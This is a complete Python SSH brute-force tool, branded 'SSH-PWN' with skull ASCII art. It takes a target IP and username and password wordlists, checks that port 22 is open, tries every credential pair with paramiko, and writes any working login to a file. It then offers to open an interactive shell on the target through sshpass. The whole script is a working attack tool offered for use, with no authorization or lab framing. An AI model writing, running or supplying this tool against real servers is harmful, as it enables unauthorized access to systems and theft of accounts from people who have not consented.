#!/usr/bin/python3

import socket
import sys
import paramiko
from colorama import init, Fore
import subprocess
import time

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

print(f"""{RED}


                ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
                ⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
                ⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
                ⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
                ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
                ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                ⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
                ⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
                ⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
                ⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
                ⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
                ⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀
                ⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
                ⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

 _______  _______  _______            ______  ________  _______
|     __||     __||   |   |  ______  |   __ \|  |  |  ||    |  |
|__     ||__     ||       | |______| |    __/|  |  |  ||       |
|_______||_______||___|___|          |___|   |________||__|____|
{RESET}
""")
      
host = input("Please enter the target IP you want to PWN: ") #prompt user to input target ip address

while True:
    try:
        password_file = input("Please enter the password file you want to use: ")
        with open(password_file) as f:
            # File exists, break out of the loop
            break
    except FileNotFoundError:     #if file not found print error and prompt for another file
        print(f"{RED}File not found - please give a valid filename{RESET}")
        
while True:
    try:
        username_file = input("Please enter the username file you want to use: ")
        with open(username_file) as f:
            # File exists, break out of the loop
            break
    except FileNotFoundError:     #if file not found print error and prompt for another file
        print(f"{RED}File not found - please give a valid filename{RESET}")

port = 22
attempts = 0
valid_creds_found = False
valid_user = ""
valid_pass = ""

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(90)

print("\n")


#function to scan tcp ports to check if SSH port (22) is open
def portScanner(port):
    if s.connect_ex((host, port)):
        print(f"{RED}The port is closed{RESET}")
        exit()  #exit script if port is closed
    else:
        print(f"{GREEN}The SSH port (22) is open{RESET}")  #print message if port is open

#execute port scanner function
portScanner(port)

time.sleep(1)

print("\n")

with open(password_file, "r") as password_list:   #opens password file and iterates through it
    with open(username_file, "r") as username_list:   #opens username file and iterates through it
        for username in username_list:   #iterate through each item in list
            username = username.strip("\n")   #cleans up the username and removes the new line
            password_list.seek(0)  # reset password list to beginning for each username
            for password in password_list:   #iterates through each item in list
                password = password.strip("\n")   #cleans up the username and removes the new line
                try:
                    print("[{}] Attempting username: '{}' password: '{}'!".format(attempts, username, password))
                    client = paramiko.SSHClient()       #sets up ssh client
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())   #automatically add new hostname and key to local HostKeys object
                    client.connect(host, port=port, username=username, password=password, timeout=90, banner_timeout=200, auth_timeout=200) #connect to ssh
                    print(bcolors.OKCYAN + "[>] Valid credentials found --> username: {}  --> password: {} ".format(username, password) + bcolors.ENDC)
                    client.close() #close ssh client
                    valid_creds_found = True  #we have found valid creds so assign this to true
                    valid_user = "{}".format(username)  #assign valid username to a variable - valid_user
                    valid_pass = "{}".format(password)  #assign valid password to a variable - valid_pass
                    print(f"""{RED}
                                  _ 
                                 | |
     _ ____      ___ __   ___  __| |
    | '_ \ \ /\ / / '_ \ / _ \/ _` |
    | |_) \ V  V /| | | |  __/ (_| |
    | .__/ \_/\_/ |_| |_|\___|\__,_|
    | |                             
    |_|                             
                    
                    {RESET}""")
                    print(bcolors.OKCYAN + "Found Valid Username: " + bcolors.ENDC + valid_user) #just here to test if valid creds are stored in variables correctly
                    print(bcolors.OKCYAN + "Found Valid Password: " + bcolors.ENDC + valid_pass) #just here to test if valid creds are stored in variables correctly
                    print("\n")
                    print("*******************************************************")
                    print(f"{GREEN}Saving valid credentials to 'credentials<host IP>.txt' !{RESET}")
                    print("*******************************************************")
                    print("\n")
                    file = open("credentials{}.txt".format(host), "w")
                    file.write("Host: " + host + "\n" + "Username: " + valid_user + "\n" + "Password: " + valid_pass + "\n")
                    file.close
                    break
                except KeyboardInterrupt: #exit script with ctrl-c
                    print("\n")
                    print("Exiting...") 
                    sys.exit()
                except paramiko.ssh_exception.AuthenticationException:  #if invalid creds print the message
                    print("[X] Invalid credentials: '{}' '{}'!".format(username, password))
                    client.close() #close ssh client - need to do this otherwise we will get error from the ssh server because too many open connections
                except Exception as e:  #if error print error message
                    print(f"[X] Exception occurred: {e}")
                attempts += 1  #add 1 to attempts
            if valid_creds_found: #if valid creds found, exit loop
                break

if not valid_creds_found:  #if no valid creds are found print the message
    print("[X] Could not find valid credentials.") 

time.sleep(2)

#ask user if they want to log into the ssh server with the found creds
answer = None
while answer not in ("yes", "no"):
    answer = input("Would you like to use the found credentials to log into the SSH server?\nenter yes or no:\n")
    if answer == "yes":
        continue
    elif answer == "no":
        print("\n")
        print("Exiting")
        sys.exit()   #if no, exit the script
    else:
        print("Please enter yes or no.")

#message saying 'logging into server' etc.
time.sleep(1)
print(f"{RED}<--- Logging into the SSH server with found credentials ---> {RESET}\n")
time.sleep(1)
print(f"{BLUE}To exit the SSH shell, type 'exit'{RESET}")
time.sleep(1)
print("\n")

#log into the ssh server
subprocess.run(["sshpass", "-p", valid_pass, "ssh", "-l", valid_user, host, "-p", str(port)])  #use sub process to execute ssh command and get openssh shell

